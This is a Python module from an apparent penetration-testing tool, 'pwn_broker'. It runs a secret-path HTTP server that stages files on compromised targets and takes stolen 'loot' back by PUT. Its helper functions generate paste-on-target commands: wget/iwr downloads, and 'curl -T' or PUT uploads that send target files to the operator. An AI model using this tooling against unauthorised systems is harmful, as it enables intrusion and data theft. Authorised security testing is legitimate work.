"""A small web server, in the background, that offers files to the targets: the current target's
upload folder, and the files the box's tools put in /opt/pwn-broker/upload.

The prompt binds the socket itself, so a port in use or an address this machine does not have is
said at once, then hands it to a child process of its own that serves until `serve stop`, or until
the box that started it is finished. The marker in /opt/pwn-broker/run/serve names that process
by its ID, its start time and its command line, so a reused process ID is never signalled.
"""

import hmac
import ipaddress
import json
import os
import secrets
import shutil
import signal
import string
import socket
import subprocess
import sys
import time
import urllib.parse
from collections.abc import Callable
from dataclasses import asdict, dataclass
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from pwn_broker import boxes, toolstate
from pwn_broker.model import Box, Target
from pwn_broker.paths import AppPaths
from pwn_broker.store import StoreError, read_toml, write_toml

MODULE = "pwn_broker.serving"
UPLOAD = "upload"
POLL = 0.1
NONE_RUNNING = "nothing is being served"
NO_TUNNEL = "no tunnel is up; name an interface or address, such as: serve eth0"
LOG_LINES = 20
# how long the prompt waits for the server's line that it is answering
READY_WAIT = 3.0
# the random first part of every URL: 62**6, some 57 billion, so no one guesses it
SECRET_LENGTH = 6
SECRET_LETTERS = string.ascii_letters + string.digits


def new_secret() -> str:
    return "".join(secrets.choice(SECRET_LETTERS) for _ in range(SECRET_LENGTH))


def ready_line(pid: int) -> str:
    return f"listening, process {pid}"


def _said(paths: "AppPaths", line: str) -> bool:
    return any(row.endswith("  " + line) for row in log_tail(paths, 5))


class ServeError(Exception):
    pass


@dataclass
class Marker:
    pid: int
    start: str
    box_id: str
    box_name: str
    target: str
    folder: str
    secret: str
    address: str
    port: int
    started: datetime


def _folder(paths: AppPaths) -> Path:
    return paths.run / "serve"


def _marker_path(paths: AppPaths) -> Path:
    return _folder(paths) / "marker.toml"


def log_path(paths: AppPaths) -> Path:
    return _folder(paths) / "serve.log"


def url(address: str, port: int, path: str = "/") -> str:
    host = f"[{address}]" if ":" in address else address
    shown = host if port == 80 else f"{host}:{port}"
    return f"http://{shown}{path}"


def default_port(root: bool) -> int:
    # 80 makes the shortest download line, and only root may bind it
    return 80 if root else 8000


# ---- the real process checks; ours() looks them up when called, so tests can refuse them


def pid_alive(pid: int) -> bool:
    return boxes.pid_alive(pid)


def process_start(pid: int) -> str | None:
    return toolstate.process_start(pid)


def process_cmdline(pid: int) -> list[str] | None:
    if sys.platform == "win32":
        return None
    try:
        with open(f"/proc/{pid}/cmdline", "rb") as fh:
            raw = fh.read()
    except OSError:
        return None
    return raw.decode("utf-8", "replace").split("\0")


# ---- the marker


def _read_marker(paths: AppPaths) -> Marker | None:
    try:
        data = read_toml(_marker_path(paths))
    except StoreError:
        return None
    kinds = {
        "pid": int, "start": str, "box_id": str, "box_name": str, "target": str,
        "folder": str, "secret": str, "address": str, "port": int, "started": datetime,
    }  # fmt: skip
    for key, kind in kinds.items():
        value = data.get(key)
        if not isinstance(value, kind) or isinstance(value, bool):
            return None
    if data["pid"] < 1 or not data["start"]:
        return None
    return Marker(**{key: data[key] for key in kinds})


def ours(
    paths: AppPaths,
    *,
    alive: Callable[[int], bool] | None = None,
    started: Callable[[int], str | None] | None = None,
    cmdline: Callable[[int], list[str] | None] | None = None,
) -> Marker | None:
    """The marker, only while its process is alive, has the recorded start time and is the server."""
    marker = _read_marker(paths)
    if marker is None:
        return None
    if not (alive if alive is not None else pid_alive)(marker.pid):
        try:
            _marker_path(paths).unlink(missing_ok=True)
        except OSError:
            pass
        return None
    if (started if started is not None else process_start)(marker.pid) != marker.start:
        return None
    argv = (cmdline if cmdline is not None else process_cmdline)(marker.pid) or []
    if not any(MODULE in part for part in argv):
        return None
    return marker


# ---- where to listen


def interfaces(run: Callable = subprocess.run) -> dict[str, list[str]]:
    """Each interface's IPv4 addresses, from `ip`; empty when it cannot be read."""
    try:
        done = run(
            ["ip", "-j", "-4", "addr", "show"],
            capture_output=True, text=True, errors="replace", timeout=2, check=False,
        )  # fmt: skip
        if done.returncode != 0:
            return {}
        found: dict[str, list[str]] = {}
        for entry in json.loads(done.stdout):
            addresses = []
            for info in entry.get("addr_info") or []:
                if info.get("family") == "inet":
                    addresses.append(str(ipaddress.IPv4Address(info.get("local"))))
            found[str(entry["ifname"])] = addresses
        return found
    except (OSError, subprocess.SubprocessError, ValueError, TypeError, KeyError, AttributeError):
        return {}


def resolve(given: str | None, tunnel: str | None, known: dict[str, list[str]]) -> str:
    """The address to listen on: the tunnel's when nothing is given, an interface's first IPv4
    address, or an address of this machine. 0.0.0.0 is taken as asked: every interface."""
    if given is None:
        if tunnel is None:
            raise ServeError(NO_TUNNEL)
        return tunnel
    if given in known:
        if not known[given]:
            raise ServeError(f"{given} has no IPv4 address")
        return known[given][0]
    try:
        address = str(ipaddress.IPv4Address(given))
    except ValueError:
        names = ", ".join(sorted(known)) or "none found"
        raise ServeError(f"{given} is neither an interface nor an IPv4 address (interfaces: {names})") from None
    if address != "0.0.0.0" and known and address not in {a for found in known.values() for a in found}:
        raise ServeError(f"{address} is not an address of this machine")
    return address


def parse_port(text: str | None, root: bool) -> int:
    if text is None:
        return default_port(root)
    if not (text.isascii() and text.isdecimal()) or not 1 <= int(text) <= 65535:
        raise ServeError(f"not a port: {text}")
    return int(text)


# ---- what is offered


def target_folder(box: Box, target: Target) -> Path:
    return box.path / "targets" / target.name / UPLOAD


def _visible(name: str) -> bool:
    return not name.startswith(".")


def _walk(root: Path, prefix: str) -> list[tuple[str, Path]]:
    found: list[tuple[str, Path]] = []
    try:
        entries = sorted(os.scandir(root), key=lambda e: e.name)
    except OSError:
        return found
    for entry in entries:
        if not _visible(entry.name) or entry.is_symlink():
            continue
        if entry.is_dir(follow_symlinks=False):
            found += _walk(Path(entry.path), f"{prefix}{entry.name}/")
        elif entry.is_file(follow_symlinks=False):
            found.append((f"{prefix}{entry.name}", Path(entry.path)))
    return found


def offered(folder: Path, tools: Path) -> list[tuple[str, Path]]:
    """Every file served, by URL path: the target's at the top, each tool's under its name. A name
    at the top that is also a tool's folder is the tool's."""
    tool_names = set()
    try:
        tool_names = {e.name for e in os.scandir(tools) if e.is_dir(follow_symlinks=False) and _visible(e.name)}
    except OSError:
        pass
    mine = [(p, f) for p, f in _walk(folder, "/") if p.split("/")[1] not in tool_names]
    return mine + _walk(tools, "/")


def download_lines(os_name: str, link: str, name: str) -> list[str]:
    """The line to paste on the target for one file, by the box's OS; both kinds when it is neither."""
    windows = f"iwr {link} -OutFile {name}"
    linux = f"wget {link}"
    kind = os_name.strip().lower()
    if kind.startswith("win"):
        return [windows]
    if kind in ("linux", "unix", "freebsd", "openbsd", "macos") or kind.endswith("bsd"):
        return [linux]
    return [linux, windows]


# ---- receiving, for a target to send files back


LOOT = "loot"
# one file a target sends: large enough for a disk image's worth of loot, small enough to bound it
MAX_RECEIVE = 4 * 1024**3
# what is left free on the disk after a file is taken in
ROOM_LEFT = 1024**3
MAX_NAME_BYTES = 200


class NoRoom(Exception):
    pass


def loot_folder(upload: Path) -> Path:
    # the target's upload folder and its loot folder sit side by side
    return upload.parent / LOOT


def received_name(request_path: str, secret: str) -> str | None:
    """The file name a PUT asks to save, or None: the path must be the run's secret and one plain
    name, with no folder, no dot at the start and nothing unprintable."""
    parts = [p for p in urllib.parse.unquote(request_path.split("?", 1)[0]).split("/") if p]
    if len(parts) != 2 or not hmac.compare_digest(parts[0].encode(), secret.encode()):
        return None
    name = parts[1]
    if not _visible(name) or name in (".", "..") or "\\" in name or not name.isprintable():
        return None
    if len(name.encode("utf-8", "surrogateescape")) > MAX_NAME_BYTES:
        return None
    return name


def _free_name(folder: Path, name: str) -> list[Path]:
    stem, suffix = Path(name).stem, Path(name).suffix
    return [folder / (name if n == 1 else f"{stem}-{n}{suffix}") for n in range(1, 1000)]


def receive_into(loot: Path, name: str, size: int, reader) -> Path:
    """Write exactly `size` bytes from `reader` into loot/, under `name` or, when that is taken,
    `name-2` and on: never over a file that is there. Written to a temporary name first, which
    the box's file scan leaves out, so a cut transfer leaves nothing behind."""
    from pwn_broker.filescan import TEMP_PREFIX, TEMP_SUFFIX

    if loot.is_symlink():
        raise OSError(f"{loot} is a link")
    loot.mkdir(parents=True, exist_ok=True)
    if size > shutil.disk_usage(loot).free - ROOM_LEFT:
        raise NoRoom()
    tmp = loot / f"{TEMP_PREFIX}{secrets.token_hex(8)}{TEMP_SUFFIX}"
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_BINARY", 0)
    fd = os.open(tmp, flags, 0o600)
    try:
        with os.fdopen(fd, "wb") as out:
            left = size
            while left:
                piece = reader.read(min(left, 64 * 1024))
                if not piece:
                    raise OSError("the transfer was cut short")
                out.write(piece)
                left -= len(piece)
        for dest in _free_name(loot, name):
            try:
                # a link fails on a name that is there; nothing is ever replaced
                os.link(tmp, dest)
            except FileExistsError:
                continue
            return dest
        raise OSError(f"no free name for {name}")
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass


def upload_lines(os_name: str, base: str) -> list[str]:
    """The line a target runs to send a file back, by the box's OS; `base` ends in /."""
    windows = f"iwr -Method PUT -InFile <file> {base}<file>"
    linux = f"curl -T <file> {base}"
    kind = os_name.strip().lower()
    if kind.startswith("win"):
        return [windows]
    if kind in ("linux", "unix", "freebsd", "openbsd", "macos") or kind.endswith("bsd"):
        return [linux]
    return [linux, windows]


# ---- starting and stopping


# The middle process starts the server in a session of its own, prints its ID and exits. The
# prompt reaps the middle one at once; the server, left with no parent, is reaped by init when it
# ends, so it never lingers as a zombie whose ID still looks alive to the checks.
LAUNCH = (
    "import subprocess, sys; fd = int(sys.argv[1]); out = open(sys.argv[2], 'ab'); "
    "child = subprocess.Popen(sys.argv[3:], pass_fds=(fd,), stdin=subprocess.DEVNULL, stdout=out, "
    "stderr=out, cwd='/', start_new_session=True); print(child.pid)"
)


def spawn(argv: list[str], fd: int, log: Path) -> int:
    """Start the server through a middle process; its process ID, or None when it did not start."""
    done = subprocess.run(
        [sys.executable, "-I", "-c", LAUNCH, str(fd), str(log), *argv],
        pass_fds=(fd,), stdin=subprocess.DEVNULL, capture_output=True, text=True, cwd="/", timeout=10,
        check=False,
    )  # fmt: skip
    text = done.stdout.strip()
    return int(text) if done.returncode == 0 and text.isdecimal() else None


def child_argv(fd: int, log: Path, folder: Path, tools: Path, secret: str) -> list[str]:
    # -I keeps the child from importing anything from its folder or the environment; the package's
    # own folder is put on the path by hand, for a checkout that is not installed
    here = str(Path(__file__).resolve().parent.parent)
    # with -c, sys.argv is ['-c', MODULE, ...]: the module's name only marks the process as the server
    code = f"import sys; sys.path.insert(0, {here!r}); import {MODULE} as s; s.main(sys.argv[2:])"
    return [sys.executable, "-I", "-c", code, MODULE, str(fd), str(log), str(folder), str(tools), secret]


def start(
    paths: AppPaths,
    box: Box,
    target: Target,
    address: str,
    port: int,
    *,
    clock: Callable[[], datetime],
    spawn: Callable[[list[str], int, Path], int | None] = spawn,
    alive: Callable[[int], bool] | None = None,
    started: Callable[[int], str | None] | None = None,
    sleep: Callable[[float], None] = time.sleep,
) -> Marker:
    folder = target_folder(box, target)
    folder.mkdir(parents=True, exist_ok=True)
    run = _folder(paths)
    run.mkdir(mode=0o700, parents=True, exist_ok=True)
    log = log_path(paths)
    secret = new_secret()
    try:
        sock = socket.create_server((address, port))
    except PermissionError:
        raise ServeError(f"port {port} needs root; give another, such as: serve {address} 8000") from None
    except OSError as exc:
        reason = exc.strerror or str(exc)
        raise ServeError(f"cannot listen on {address} port {port}: {reason}") from None
    try:
        with open(log, "a", encoding="utf-8") as fh:
            fh.write(f"{clock():%Y-%m-%d %H:%M:%S}  serving {url(address, port)} for {box.name}/{target.name}\n")
        os.chmod(log, 0o600)
        pid = spawn(child_argv(sock.fileno(), log, folder, paths.upload, secret), sock.fileno(), log)
    finally:
        # the server holds its own copy; this prompt never answers on it
        sock.close()
    if pid is None:
        raise ServeError("the server did not start; see: serve log")
    living = alive if alive is not None else pid_alive
    # only the server's own line says it is answering; being alive for a moment proves nothing
    said = ready_line(pid)
    for _ in range(int(READY_WAIT / POLL)):
        if not living(pid) or _said(paths, said):
            break
        sleep(POLL)
    begun = (started if started is not None else process_start)(pid)
    if not living(pid) or not _said(paths, said) or not begun:
        if living(pid):
            try:
                os.kill(pid, signal.SIGTERM)
            except OSError:
                pass
        raise ServeError("the server did not start; see: serve log")
    marker = Marker(pid, begun, box.id, box.name, target.name, str(folder), secret, address, port, clock())
    write_toml(_marker_path(paths), asdict(marker))
    return marker


def stop(
    paths: AppPaths,
    *,
    kill: Callable[[int, int], None] = os.kill,
    sleep: Callable[[float], None] = time.sleep,
    wait: float = 3.0,
    **checks,
) -> Marker:
    """Signal the server only once ours() has checked its ID, start time and command line."""
    marker = ours(paths, **checks)
    if marker is None:
        raise ServeError(NONE_RUNNING)
    try:
        kill(marker.pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    for _ in range(max(1, int(wait / POLL))):
        if ours(paths, **checks) is None:
            break
        sleep(POLL)
    else:
        raise ServeError(f"the server (process {marker.pid}) did not stop")
    try:
        _marker_path(paths).unlink(missing_ok=True)
    except OSError:
        pass
    return marker


def log_tail(paths: AppPaths, lines: int = LOG_LINES) -> list[str]:
    try:
        text = log_path(paths).read_bytes().decode("utf-8", "replace")
    except OSError:
        return []
    return text.splitlines()[-lines:] if lines > 0 else []


# ---- the server, in the child process


def _inside(path: Path, root: Path) -> bool:
    try:
        real, base = os.path.realpath(path), os.path.realpath(root)
    except OSError:
        return False
    return real == base or real.startswith(base.rstrip(os.sep) + os.sep)


def find(folder: Path, tools: Path, request_path: str, secret: str) -> Path | None:
    """The file a URL path names, or None. The path starts with the run's secret. Read on every
    request, so a file dropped in later is served; a dot name, a link, a folder or anything
    outside the two folders is not."""
    parts = [p for p in urllib.parse.unquote(request_path.split("?", 1)[0]).split("/") if p]
    if not parts or not hmac.compare_digest(parts[0].encode(), secret.encode()):
        return None
    parts = parts[1:]
    if not parts or any(p in (".", "..") or not _visible(p) or "\\" in p or "\0" in p for p in parts):
        return None
    for root in ((tools, folder) if (tools / parts[0]).is_dir() else (folder,)):
        candidate = root.joinpath(*parts)
        # a link anywhere on the way is refused, as the listing leaves links out
        steps = [root.joinpath(*parts[: n + 1]) for n in range(len(parts))]
        if any(step.is_symlink() for step in steps):
            continue
        if not candidate.is_file() or not _inside(candidate, root):
            continue
        return candidate
    return None


def _shown(text: str) -> str:
    # what a client sent, with anything unprintable made visible, so a log line stays one line
    return "".join(c if c.isprintable() else "?" for c in text)


def _handler(
    folder: Path, tools: Path, secret: str, log: Callable[[str], None]
) -> type[BaseHTTPRequestHandler]:
    loot = loot_folder(folder)

    class Handler(BaseHTTPRequestHandler):
        server_version = "pwn-broker"
        sys_version = ""
        # 1.1, so a client that sends Expect: 100-continue before a large upload is answered at once
        protocol_version = "HTTP/1.1"
        saved = ""

        def _answer(self, body: bool) -> None:
            # no listing, of / or any folder: only a request for a file by its exact name is answered,
            # so whoever reaches the address learns nothing of what else is offered
            found = find(folder, tools, self.path, secret)
            try:
                fh = open(found, "rb") if found is not None else None
            except OSError:
                fh = None
            if fh is None:
                self._head(404, 10, "text/plain; charset=utf-8")
                if body:
                    self.wfile.write(b"not found\n")
                return
            with fh:
                self._head(200, os.fstat(fh.fileno()).st_size, "application/octet-stream")
                if body:
                    shutil.copyfileobj(fh, self.wfile)

        def _reply(self, status: int, text: str) -> None:
            data = text.encode()
            self._head(status, len(data), "text/plain; charset=utf-8")
            self.wfile.write(data)

        def do_PUT(self) -> None:  # noqa: N802
            name = received_name(self.path, secret)
            length = self.headers.get("Content-Length", "")
            if name is None or not (length.isascii() and length.isdecimal()):
                # the body is not read, so the connection cannot be used again
                self.close_connection = True
                self._reply(404 if name is None else 411, "not found\n" if name is None else "length required\n")
                return
            size = int(length)
            if size > MAX_RECEIVE:
                self.close_connection = True
                self._reply(413, "too large\n")
                return
            try:
                dest = receive_into(loot, name, size, self.rfile)
            except NoRoom:
                self.close_connection = True
                self._reply(507, "not enough space\n")
                return
            except OSError:
                self.close_connection = True
                self._reply(500, "not saved\n")
                return
            self.saved = f"  saved {LOOT}/{dest.name}"
            self._reply(201, f"saved {dest.name}\n")

        def _head(self, status: int, size: int, kind: str) -> None:
            self.send_response(status)
            self.send_header("Content-Type", kind)
            self.send_header("Content-Length", str(size))
            self.end_headers()

        def do_GET(self) -> None:  # noqa: N802
            self._answer(True)

        def do_HEAD(self) -> None:  # noqa: N802
            self._answer(False)

        def log_request(self, code="-", size="-") -> None:
            # every answer passes through here, a malformed request's 400 included
            status = getattr(code, "value", code)
            line = _shown(getattr(self, "requestline", "") or "-")
            saved, self.saved = self.saved, ""
            log(f"{datetime.now().astimezone():%Y-%m-%d %H:%M:%S}  {self.client_address[0]}  {line}  {status}{saved}")

        def log_message(self, format: str, *args) -> None:  # noqa: A002
            pass

    return Handler


def main(argv: list[str]) -> None:
    fd, log_file, folder, tools, secret = int(argv[0]), Path(argv[1]), Path(argv[2]), Path(argv[3]), argv[4]
    sock = socket.socket(fileno=fd)

    def log(line: str) -> None:
        try:
            with open(log_file, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        except OSError:
            pass

    server = ThreadingHTTPServer(sock.getsockname()[:2], _handler(folder, tools, secret, log), bind_and_activate=False)
    server.daemon_threads = True
    server.socket.close()
    server.socket = sock
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))
    log(f"{datetime.now().astimezone():%Y-%m-%d %H:%M:%S}  {ready_line(os.getpid())}")
    try:
        server.serve_forever()
    finally:
        sock.close()
